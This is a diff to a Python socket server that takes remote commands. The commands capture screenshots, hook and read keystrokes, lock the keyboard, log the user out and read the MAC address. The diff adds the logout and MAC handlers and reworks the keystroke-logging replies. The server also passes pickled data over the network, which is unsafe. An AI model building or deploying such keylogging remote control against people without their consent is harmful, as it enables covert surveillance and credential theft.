@@ -2,7 +2,7 @@ import os
 from pickle import loads, dumps
 import socket
 import threading
-import utils, process, keystroke, registry, lock_keyboard
+import utils, process, keystroke, registry, mac, lock_keyboard
 
 HOST = socket.gethostname()
 PORT = 10000
@@ -61,6 +61,16 @@ def connection_handler(connection, address):
                 data = None
             send(connection, ok, data)
 
+        elif header == 'logout':
+            try:
+                utils.logout()
+                ok = True
+                data = None
+            except:
+                ok = False
+                data = None
+            send(connection, ok, data)
+
         elif header == 'getscreenshot':
             try:
                 ok = True
@@ -111,16 +121,33 @@ def connection_handler(connection, address):
             send(connection, ok, data)
 
         elif header == 'keystroke-hook':
-            data = dumps(keystroke_detector.start_listening())
-            connection.sendall(data)
+            try:
+                keystroke_detector.start_listening()
+                ok = True
+                data = None
+            except:
+                ok = False
+                data = None
+            send(connection, ok, data)
 
         elif header == 'keystroke-unhook':
-            data = dumps(keystroke_detector.end_listening())
-            connection.sendall(data)
+            try:
+                keystroke_detector.end_listening()
+                ok = True
+                data = None
+            except:
+                ok = False
+                data = None
+            send(connection, ok, data)
 
         elif header == 'keystroke-get':
-            data = dumps(keystroke_detector.get_keys())
-            connection.sendall(data)
+            try:
+                ok = True
+                data = keystroke_detector.get_keys()
+            except:
+                ok = False
+                data = None
+            send(connection, ok, data)
 
         elif header == 'lock-keyboard':
             try:
@@ -211,7 +238,16 @@ def connection_handler(connection, address):
                 ok = False
                 data = None
             send(connection, ok, data)
-        
+
+        elif header == 'mac-address':
+            try:
+                ok = True
+                data = mac.get_address()
+            except:
+                ok = False
+                data = None
+            send(connection, ok, data)
+
         else:
             send(connection, False)
     
